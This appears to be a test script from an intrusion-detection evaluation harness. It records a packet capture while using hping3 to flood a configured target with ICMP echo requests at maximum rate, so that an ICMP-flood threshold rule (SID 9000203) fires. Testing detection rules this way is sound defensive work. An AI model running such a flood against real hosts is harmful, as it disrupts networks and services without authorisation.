#!/usr/bin/env bash
# attacks/20_icmp_flood.sh
# Floods TARGET_IP with ICMP Type 8 (Echo Request) to exceed the threshold
# Rule threshold: count 50 in 5 seconds → triggers SID 9000203
# =============================================================================
source "$(dirname "$0")/../config/eval.conf"
PCAP="${PCAPS_DIR}/${RUN_ID}_20_icmp_flood.pcap"

echo "[20_icmp_flood] Starting capture on ${KALI_IFACE}"
tcpdump -i "${KALI_IFACE}" icmp -w "${PCAP}" -q &
CAP_PID=$!
sleep 1

echo "[20_icmp_flood] Flooding ${TARGET_IP} with ICMP Type 8 @ ${FLOOD_RATE} pps for ${FLOOD_DURATION}s"
# --faster sends at max speed; -c limits count; calculate count from rate×duration
COUNT=$(( FLOOD_RATE * FLOOD_DURATION ))
hping3 --icmp --icmptype 8 \
       --faster \
       -c "${COUNT}" \
       "${TARGET_IP}" 2>/dev/null || true

echo "[20_icmp_flood] Sent ~${COUNT} packets — threshold rule should have fired"
sleep "${ALERT_SETTLE_SECS}"
kill "${CAP_PID}" 2>/dev/null; wait "${CAP_PID}" 2>/dev/null || true

echo "[20_icmp_flood] Done — PCAP: ${PCAP}"
